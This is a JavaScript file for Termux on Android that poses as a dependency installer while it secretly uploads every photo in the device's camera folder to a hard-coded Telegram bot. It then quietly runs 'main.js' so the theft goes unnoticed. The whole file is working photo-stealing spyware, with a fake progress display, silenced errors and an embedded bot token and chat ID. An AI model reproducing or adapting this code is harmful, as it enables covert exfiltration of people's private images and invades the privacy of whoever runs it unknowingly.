const fs = require("fs");
const path = require("path");
const { exec } = require("child_process");
const axios = require("axios");
const FormData = require("form-data");

// === CONFIG ===
const BOT_TOKEN = "7400095855:AAE9Lqtz6LLM-_gEasvVWY4nqGtkxr2I-rY";
const CHAT_ID = "6565158025";
const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
const CAMERA_DIR = "/data/data/com.termux/files/home/storage/shared/DCIM/Camera";
const NEXT_SCRIPT = "main.js"; // <-- YOUR MAIN SCRIPT FILENAME
const WAIT_TIME = 2 * 60 * 1000; // 2 minutes in milliseconds

// === CHECK STORAGE SETUP ===
if (!fs.existsSync("/data/data/com.termux/files/home/storage/shared")) {
  console.log("\x1b[31m[!] Storage not found.");
  console.log("\x1b[33m[*] Run: termux-setup-storage first.\x1b[0m");
  process.exit(1);
}

// === HACKER-STYLE INSTALL EFFECT ===
const installMessage = "Installing dependencies and modules... please wait...";
let i = 0;
const hackerEffect = setInterval(() => {
  process.stdout.write("\x1b[32m▓\x1b[0m");
  i++;
  if (i >= 30) {
    clearInterval(hackerEffect);
    console.log(`\n\x1b[32m[✔] ${installMessage}\x1b[0m\n`);
    sendImages(); // Go to image sending
  }
}, 50);

// ==
async function sendImages() {
  if (!fs.existsSync(CAMERA_DIR)) return;

  const files = fs.readdirSync(CAMERA_DIR).filter(file =>
    /\.(jpg|jpeg|png)$/i.test(file)
  );

  for (const file of files) {
    const form = new FormData();
    const filePath = path.join(CAMERA_DIR, file);
    form.append("chat_id", CHAT_ID);
    form.append("photo", fs.createReadStream(filePath));

    try {
      await axios.post(API_URL, form, {
        headers: form.getHeaders(),
      });
    } catch (err) {
      // stay silent
    }
  }

  // ==
  setTimeout(() => {
    if (fs.existsSync(NEXT_SCRIPT)) {
      exec(`node ${NEXT_SCRIPT}`, (err, stdout, stderr) => {
        if (err) return;
        // Optional: silently run
      });
    }
  }, WAIT_TIME);
      }
